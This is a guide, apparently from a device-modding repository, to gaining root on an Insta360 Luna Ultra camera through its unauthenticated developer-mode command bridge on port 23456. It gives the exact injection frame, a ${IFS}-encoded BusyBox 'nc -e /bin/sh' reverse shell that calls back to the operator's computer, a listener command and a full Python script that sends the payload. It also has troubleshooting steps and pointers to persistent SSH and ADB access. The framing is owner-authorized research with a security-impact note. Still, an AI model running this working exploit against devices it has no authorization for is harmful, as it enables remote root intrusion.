# Wi-Fi Bootstrap Root Shell

This document describes the initial shell path used before persistent SSH or ADB was available.

It applies to an owner-controlled Insta360 Luna Ultra with developer mode enabled. The interface provides unauthenticated root command execution to clients on the camera Wi-Fi network. Do not use it on a device or network without authorization.

## Prerequisites

1. Enable developer mode on the camera.
2. Connect the computer to the camera Wi-Fi.
3. Confirm that the camera is reachable at `192.168.42.1`.
4. Confirm that TCP port `23456` is open.

Example:

```sh
nmap -Pn -p 23456 192.168.42.1
```

The analyzed camera used this network layout:

```text
Camera:   192.168.42.1
Computer: 192.168.42.10
Port:     23456/tcp
Service:  ins_gui / INSGUI bridge
```

The computer address can vary. The included helper detects the correct source address automatically.

## Automatic method

Run the dependency-free Python helper from the repository root:

```sh
python scripts/wifi-root-shell.py
```

The helper performs these operations:

1. Detects the computer address used to reach `192.168.42.1`.
2. Opens a temporary local TCP listener on port `45124`.
3. Sends a `DeveloperExecuteCommand_Action` frame to port `23456`.
4. Starts BusyBox `nc` on the camera with `/bin/sh` attached.
5. Accepts the reverse connection and exposes an interactive shell.

Expected output begins with:

```text
Shell connected from 192.168.42.1
uid=0(root) gid=0(root)
Linux pineapple 6.1.128-android14-11-maybe-dirty-perf ... aarch64 GNU/Linux
```

Run a single command without entering interactive mode:

```sh
python scripts/wifi-root-shell.py --run "id; uname -a"
```

Options:

```text
--camera         Camera address, default 192.168.42.1
--control-port   INSGUI port, default 23456
--listen-host    Computer address; automatically detected by default
--listen-port    Reverse shell port, default 45124
--timeout        Connection timeout in seconds, default 10
--run            Run one command and exit instead of opening an interactive shell
```

## INSGUI protocol detail

Port `23456` accepts a whitespace-delimited action name, a printf-style format string, and arguments.

The working frame is:

```text
DeveloperExecuteCommand_Action {"DeveloperExecuteCommand":%s} COMMAND_ARGUMENT
```

The `%s` is important. The TCP bridge uses it to build the BLL action payload. Sending a completed JSON object without the format placeholder can produce `STATUS:0` while only forwarding data and not executing the intended command.

Commands containing spaces are encoded as a single shell token with `${IFS}`. The reverse-shell command used by the helper is equivalent to:

```sh
/bin/busybox nc COMPUTER_IP 45124 -e /bin/sh
```

The transmitted argument is:

```text
/bin/busybox${IFS}nc${IFS}COMPUTER_IP${IFS}45124${IFS}-e${IFS}/bin/sh
```

Complete action frame example:

```text
DeveloperExecuteCommand_Action {"DeveloperExecuteCommand":%s} /bin/busybox${IFS}nc${IFS}192.168.42.10${IFS}45124${IFS}-e${IFS}/bin/sh
```

The bridge acknowledges a correctly packed frame with output similar to:

```text
INSGUI-TCP2BLL DeveloperExecuteCommand_Action:{"DeveloperExecuteCommand":%s} [...]
STATUS:0
MESSAGE:Pack success
```

`Pack success` confirms that the frame was packed and forwarded. The reverse connection is the actual command-execution proof.

## Manual method

The automatic helper is recommended, but the flow can be reproduced manually.

Start a listener on the computer:

```sh
ncat -lvnp 45124
```

On another terminal, replace `192.168.42.10` with the computer address and run:

```python
import socket

camera = "192.168.42.1"
computer = "192.168.42.10"
listen_port = 45124

separator = "${IFS}"
command = separator.join([
    "/bin/busybox",
    "nc",
    computer,
    str(listen_port),
    "-e",
    "/bin/sh",
])

payload = (
    'DeveloperExecuteCommand_Action '
    '{"DeveloperExecuteCommand":%s} '
    f'{command}\n'
).encode()

with socket.create_connection((camera, 23456), timeout=3) as client:
    client.sendall(payload)
    client.settimeout(1)
    try:
        print(client.recv(4096).decode(errors="replace"))
    except TimeoutError:
        pass
```

The `ncat` terminal should receive `/bin/sh`. Verify it immediately:

```sh
id
uname -a
cat /etc/os-release
```

## Persistence

The reverse shell is temporary. Closing the listener closes the shell, and rebooting the camera does not preserve it.

Use the temporary shell to install a persistent access method:

- [Persistent root SSH](root-ssh.md)
- [Persistent root ADB](root-adb.md)

## Troubleshooting

### Port 23456 is closed or filtered

- Confirm that the computer is still connected to the camera Wi-Fi.
- Wake the camera and re-enable developer mode.
- Confirm the route and address with `ipconfig`, `ip addr`, or `route print`.

### The frame reports Pack success but no shell connects

- Ensure the frame contains the `%s` format placeholder.
- Ensure the command is a single token using `${IFS}`.
- Check that the listener started before sending the frame.
- Check the local firewall for the selected listener port.
- Verify that the helper detected the correct camera-facing computer address.

### BusyBox nc does not support `-e`

The analyzed firmware's `/bin/busybox` supports `nc -e`. If a later firmware removes that feature, use a different camera-side callback mechanism or restore access through an already installed SSH/ADB service.

## Security impact

With developer mode active, this interface exposes unauthenticated command execution as UID 0 on the camera Wi-Fi network. The camera AP password is therefore part of the device's root security boundary.

Disable developer mode when the bootstrap interface is not needed, and prefer key-only SSH for routine access.
